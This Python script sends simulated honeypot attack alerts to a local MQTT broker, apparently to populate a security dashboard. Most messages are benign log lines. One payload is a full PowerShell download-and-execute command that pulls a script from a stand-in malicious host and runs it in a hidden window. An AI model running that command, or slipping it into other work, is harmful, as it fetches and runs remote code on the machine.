import time
import json
import random
import sys

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("paho-mqtt not installed. Please install it with: pip install paho-mqtt")
    sys.exit(1)

BROKER = "localhost"
PORT = 1883

attacks = [
    {
        "topic": "honeypot/ssh/auth",
        "payload": "Failed password for root from 192.168.1.105 port 22 ssh2",
        "delay": 0.5
    },
    {
        "topic": "honeypot/http/get",
        "payload": "GET /admin.php HTTP/1.1 - 404 Not Found",
        "delay": 0.2
    },
    {
        "topic": "honeypot/cve/exploit",
        "payload": "CRITICAL: Remote Code Execution exploit detected (CVE-2024-3094)",
        "delay": 1.0
    },
    {
        "topic": "honeypot/system/cmd",
        "payload": "cmd.exe /c powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')",
        "delay": 0.8
    },
    {
        "topic": "honeypot/ftp/login",
        "payload": "Anonymous login attempt from 45.33.22.11",
        "delay": 0.3
    },
    {
        "topic": "honeypot/mysql/auth",
        "payload": "Access denied for user 'root'@'localhost' (using password: YES)",
        "delay": 0.4
    }
]

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to MQTT Broker!")
    else:
        print(f"Failed to connect, return code {rc}")

client = mqtt.Client()
client.on_connect = on_connect

try:
    client.connect(BROKER, PORT, 60)
except Exception as e:
    print(f"Could not connect to localhost:1883. Trying inside docker network...")
    # Fallback logic if running inside container would be different, but here we just report error
    print(f"Error: {e}")
    sys.exit(1)

client.loop_start()
time.sleep(1)

print("Simulating Cyber Attacks...")
for i in range(3): # Run 3 loops of attacks
    print(f"--- Wave {i+1} ---")
    for attack in attacks:
        print(f"Sending: {attack['topic']} -> {attack['payload'][:30]}...")
        client.publish(attack['topic'], attack['payload'])
        time.sleep(attack['delay'])

print("Simulation Complete. Check Dashboard.")
client.loop_stop()
client.disconnect()
